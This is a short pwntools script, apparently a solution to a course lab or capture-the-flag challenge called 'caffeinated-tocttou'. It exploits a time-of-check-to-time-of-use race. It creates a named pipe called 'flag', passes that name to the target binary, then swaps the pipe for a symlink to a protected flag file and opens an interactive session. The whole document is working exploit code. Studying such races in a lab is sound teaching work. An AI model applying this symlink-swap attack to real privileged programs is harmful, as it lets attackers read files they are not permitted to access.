from pwn import *

# Make a flag file that I have permissions for
if os.path.exists("flag"):
    os.remove("flag")
os.system("mkfifo flag")

# Launch processs
p = process('./caffeinated-tocttou')
p.sendline("flag")

f = open("flag", "w")
f.write("test")
os.remove("flag")
os.symlink("/home/labs/week7/8-caffeinated-tocttou/flag", "flag")
f.close()

p.interactive()
